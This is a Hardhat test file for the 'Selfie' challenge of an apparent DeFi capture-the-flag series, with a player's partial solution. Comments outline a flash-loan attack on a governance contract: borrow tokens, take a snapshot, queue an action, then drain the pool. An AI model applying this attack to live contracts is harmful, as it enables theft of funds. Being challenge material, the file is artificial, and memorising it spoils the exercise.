const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Ok so without looking at anything yet, my first instinct is I am gonna flashloan out a ton of DVT, use it to vote in governance
        // somehow to give myself some sort of privilege etc then return it. I vaguely recall an irl attack in DeFi that used this mechanism

        // Code check:
        // - They use the DVT token for governance
        // - You can queue a governance action with queueAction() if you have >50% of the supply at the last snapshot
        // - Anyone can make an ERC20 snapshot, it's not access controlled
        // * I could flashloan 1.5m DVT tokens, take a snapshot, then return them. Total supply is 2m so I would have enough votes to queue an action
        // - 

        const SelfieAttackFactory = await ethers.getContractFactory('SelfieAttack', attacker);
        this.attack = await SelfieAttackFactory.connect(attacker).deploy(
            this.pool.address,
            this.token.address
        );

        await this.attack.requestFlashLoan();

        console.log("Total supply at last snapshot:", await ethers.utils.formatEther(await this.token.getTotalSupplyAtLastSnapshot()));
        console.log("Our balance at last snapshot:", await ethers.utils.formatEther(await this.token.getBalanceAtLastSnapshot(this.attack.address)));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
